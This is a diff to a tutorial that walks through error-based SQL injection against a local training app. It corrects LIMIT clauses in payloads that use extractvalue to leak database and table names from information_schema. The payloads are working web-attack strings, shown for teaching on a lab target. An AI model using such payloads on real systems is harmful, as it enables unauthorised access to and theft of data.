@@ -38,7 +38,7 @@ start enumerating through to see the databases
 
 ```
 http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))-- //
-http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,2)))-- //
+http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1)))-- //
 ```
 
 ok, so now we know the database name we is sqltraining, so we can use the same tactic to get the tables in that database
@@ -50,7 +50,7 @@ http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0
 interesting a users table!
 
 ```
-http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="sqlitraining" LIMIT 1,2)))-- //
+http://localhost/product/1" AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="sqlitraining" LIMIT 1,1)))-- //
 ```
 
 Now all this enumeration might feel quite laborious, but what if instead use a simple script to do that instead
